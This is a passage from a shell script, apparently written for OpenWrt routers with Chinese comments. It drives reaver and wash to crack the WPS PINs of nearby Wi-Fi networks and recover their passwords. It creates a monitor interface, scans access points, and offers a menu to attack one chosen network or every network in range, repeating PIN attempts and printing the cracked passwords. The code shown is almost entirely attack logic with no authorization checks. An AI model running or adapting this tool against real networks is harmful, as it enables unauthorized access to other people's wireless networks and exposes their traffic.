			rm /tmp/*.wps; return 5 #删除临时文件
		fi
	done
}

#菜单
Menu() {
	while :;do
		[ -f /tmp/pin_passwd.txt ] && rm /tmp/pin_passwd.txt    #把存在存放密码的文档删除
		PIN=	#定义一个空的pin码变量
		[ ! -e /tmp/WPS_WS.txt ] && PrintFalseInfo "没有找到WPS_WS.txt文档" && return 1
		KillSofteware; clear; echo -e "${yellow}No.\tPower\tBSSID\t\tChannel\tESSID${none}"    #显示标题
		cat /tmp/WPS_WS.txt #显示wifi信息
        echo ""
		echo -en "${magenta}请选择要Pin的WiFi序列号【1-${wifi_num}】，重新扫描【s】，全部pin【a】，退出【q】，列出pin出来的密码【t】\n指定pin码【WiFi序列号空格pin码】如：1 12345678。\n可指定每个WiFi pin几次，不设置默认pin两次，设置方法如：1 3 或者a 3 \n请按提示输入：${none}"
        read select_nums #存放用户输入的参数
        [ -z "${select_nums}" ] && Error "输入为空，重新输入一下" && continue  #输入为空提示用户，并返回重新输入。
		select_num=$(echo "${select_nums}" |awk '{print $1}')
		if [ "${select_num}" == "s" ];then  #输入s，重新扫描wifi信息。
			Get_Wifi_Info; continue
		elif [ "${select_num}" == "q" ];then    #输入q，先删除监听热点、终止程序，最后退出脚本
            DeleteMonitor; KillSofteware; Delete_WPC; exit
        elif [ "${select_num}" == "a" ];then    #输入a，pin所有的wifi信息。
            echo -e "\n\n已选择pin所有网络\n"
		elif [ ${select_num} == t ];then	#输出pin出来的密码
			if [[ -f /tmp/all_passwd.txt && -n "$(cat /tmp/all_passwd.txt 2>/dev/null)" ]];then
				PrintTrueInfo "pin出来的密码，请记录好："; cat /tmp/all_passwd.txt; Notifi "回车后返回菜单"; continue
			else
				Notifi "没有找到pin出来的密码，回车后返回菜单"; continue
			fi
		elif [ -n "$(echo ${select_num} | egrep '[a-zA-Z]')" ];then    #q退出程序，并开始删除热点、开启网卡无线功能、终止程序
			Error "输入的内容没有定义功能，请按照提示输入"; continue
		elif [[ "$(echo "${select_nums}" |awk '{print NF}')" == '2' && "$(echo "${select_nums}" |awk '{print $2}' | wc -c)" == '9' ]];then
			PIN="$(echo "${select_nums}" |awk '{print $2}')"	#获取pin码
			#判断pin码和WiFi序列号是否正确，不正确循环并提示
			[[ -z "$(echo "${PIN}" | egrep "^[0-9]{8}$")" ]] && { Error "输入的WiFi序列或者pin码不正确，请按照提示输入";continue; }
			break	
		elif [[ "${select_num}" -gt "${wifi_num}" || "${select_num}" -lt "0" ]];then    #检查输入的数值大于wifi总数量提示报错信息，返回主菜单
			Error "输入的数值超出范围，请按照提示的范围输入序列号"; continue
        elif [ -z "$(echo "${select_num}" | egrep "^[0-9]+$" )" ];then  #检查输入的是否为纯数字，不是的话提示报错信息，返回主菜单
			Error "输入的数值不正确，请按照提示输入"; continue           
		fi
		circulate_num="$(echo "${select_nums}" |awk '{print $2}')"
		if [ -n "${circulate_num}" ];then
			[ -z "$(echo "${circulate_num}" | egrep "^[0-9]+$")" ] && Error "输入的循环次数不对，不是纯数字" && continue
			[[ "${circulate_num}" -gt "15" || "${circulate_num}" -lt "0" ]] && Error "输入的循环次数不要太大，把控在15次以内就行，输入为0是取消秒pin" && continue
		fi
        break
	done
	circulate_num="${circulate_num:-2}"	#当检测循环次数为空的时候默认赋值为2次。
    count=1
    while :;do
        if [ "${select_num}" == "a" ];then  #用户选择pin所有网络
            Bsid="$(cat /tmp/WPS_WS.txt | sed -n "${count}p" | awk '{print $3}')"   #逐行获取wifi的mac地址
            Chanel="$(cat /tmp/WPS_WS.txt | sed -n "${count}p" | awk '{print $4}')" #逐行获取wifi的信道
            Esid="$(cat /tmp/WPS_WS.txt | sed -n ${count}p | awk '{print $5}')"     #逐行获取wifi的名称
            [ -z ${Bsid} ] && break #检测wifi的mac地址为空，退出循环
            CleanMem; PrintTrueInfo "已选择【${count} - ${Esid}】"; sleep 3; let count+=1  #清理内存，显示信息，停留3秒，计数
        else
            Bsid="$(cat /tmp/WPS_WS.txt | sed -n "${select_num}p" | awk '{print $3}')"  #获取wifi的mac地址
            Chanel="$(cat /tmp/WPS_WS.txt | sed -n "${select_num}p" | awk '{print $4}')"    #获取wifi的信道
            Esid="$(cat /tmp/WPS_WS.txt | sed -n ${select_num}p | awk '{print $5}')"        #获取wifi的名称
            [ -z ${Bsid} ] && continue  #检测wifi的mac地址为空，重新执行循环
            PrintTrueInfo "已选择【${Esid}】"; sleep 1
		fi
		count_num=1;while [ "${count_num}" -le "${circulate_num}" ];do	#根据设定的循环次数重复pin几次
			PrintTrueInfo "正在尝试pin第 ${count_num} 次";sleep 2; Attack_Wifi
			case $? in 
				"3") break;;
				"5") return 0;;
			esac
			let count_num+=1
		done
		[ "${select_num}" != "a" ] && break
    done
    if [ "${select_num}" == "a" ];then  #全部网络pin完了，就显示下面的信息
        KillSofteware;clear
        if [ -f /tmp/pin_passwd.txt ];then
            PrintTrueInfo "pin出来的密码，请记录好。可以多尝试几遍或许能多pin出一些密码："; cat /tmp/pin_passwd.txt
        else
            PrintTrueInfo "没有pin出来密码，可以多尝试几遍或许能pin出一些密码"
        fi
        Notifi "回车后继续"; return 0
    fi

}

#找无线驱动名称
CheckWirless() {
	count=1
	while :;do
		PrintTrueInfo "正在等待配置生效，请等待5秒. . ."; sleep 5
		test_mac=$(echo ${wlan_mac} | sed "s/:/-/g" | tr '[a-z]' '[A-Z]')   #处理mac地址，把:替换成-，小写字母改成大写字母
		monitor_driver=$(ifconfig | grep -i "${test_mac}" | awk '{print $1}')	   #提取mac地址
		let count+=1	#循环一次运算相加一次
		[[ ${count} == 10 && -z ${monitor_driver} ]] && read -sp "没有获取到无线驱动名称" && exit   #有10次机会，到10次机会没有找到创建的监听热点mac地址，证明热点没有创建成功则退出程序
		[ ! -z "${monitor_driver}" ] && break #当找到驱动后退出循环。
		PrintFalseInfo "没有获取到无线驱动名称,正在重新尝试. . ."
	done
}

#终止程序
KillSofteware() {
    killall -9 wash &>/dev/null; killall -9 reaver &>/dev/null; [ ! -z ${RE_ID} ] && kill -TERM ${RE_ID} &>/dev/null
}

#检测监听热点删除监听热点
CheckMonitor() {
	while :;do
		monitor_name="$(uci show | grep 'monitor' | cut -d '.' -f 1,2)" #获取监听热点
		[ -z "${monitor_name}" ] && PrintTrueInfo "监听热点清理完成" && return 0	#获取监控热点的变量为空则清理完成，退出循环
		for i in ${monitor_name}	   #有监控热点循环删除监控热点	 
		do
			uci delete $i	   #删除监控热点
		done
		uci commit wireless; wifi reload > /dev/null	#监控热点删除后，应用无线配置和WiFi重新加载。
	done
	sleep 1
}

#检测抓包脚本依赖的软件是否存在
CheckSoftware() {
	[ ! -f /usr/bin/aircrack-ng ] && Error "系统中没有找到抓包工具，请安装抓包工具“aircrack-ng”工具然后执行抓包脚本。" && exit
    [ ! -f /usr/bin/reaver ] && Error "没有找到reaver工具，请安装后再执行此脚本" && exit
}

#主要程序===============================================>
Delete_WPC	#删除wpc临时文件
CheckSoftware   #检测抓包脚本依赖的软件是否存在
CheckMonitor    #检测监听热点删除监听热点
[ ! -e /etc/config/scp/mac.txt ] && MacAddress  #检测存放AP的mac地址文档不存在，执行生成mac地址文档的函数。
wireless_num=$(uci show | grep wireless.radio[0,1,2]=wifi | wc -l)	  #获取当前路由器的频段数量，如，单频、双频、三频
[[ -z ${wireless_num} ]] && PrintFalseInfo "没有检测到无线频段，请检查无线是否正常" && exit #检测到无线数量为空，则提示用户并退出脚本
if [ "${wireless_num}" == "1" ];then
	AddMonitor 4; PrintTrueInfo "正在等待配置生效. . ."; sleep 5; CheckWirless
elif [ ! -z "$(echo ${wireless_num} | egrep '2|3')" ];then
	while :;do
		clear
		#显示菜单======================>
		PrintTrueInfo "选择pin的频段"
		PrintTrueInfo "1、2.4G频段"
		PrintTrueInfo "2、5G频段"
		[[ "${wireless_num}" == "3" ]] &&PrintTrueInfo "3、另一个5G频段"
		#<=============================
		echo -en "${magenta}请选择输入序列号【按q退出】：${none}";read select_packe	#等待用户输入
		[[ "${select_packe}" == "q" ]] && exit  #输入为q的时候退出程序
		if [ "${select_packe}" == "1" ];then
			AddMonitor 2; CheckWirless		  #创建监听热点和检测创建的监听热点
		elif [ "${select_packe}" == "2" ];then
			AddMonitor 5; CheckWirless		  #创建监听热点和检测创建的监听热点
		elif [ "${select_packe}" == "3" ];then
			AddMonitor 6; CheckWirless		  #创建监听热点和检测创建的监听热点
		else
			Error "请按照提示输入"; continue
		fi
		break
	done
fi
Get_Wifi_Info   #获取wifi相关的信息
while :;do  
    Menu    #菜单，显示wifi相关的信息，并选择
    [ $? != 0 ] && { DeleteMonitor; KillSofteware; exit; }   #判断菜单返回值，为非零的，证明是退出脚本
done
#<==================================================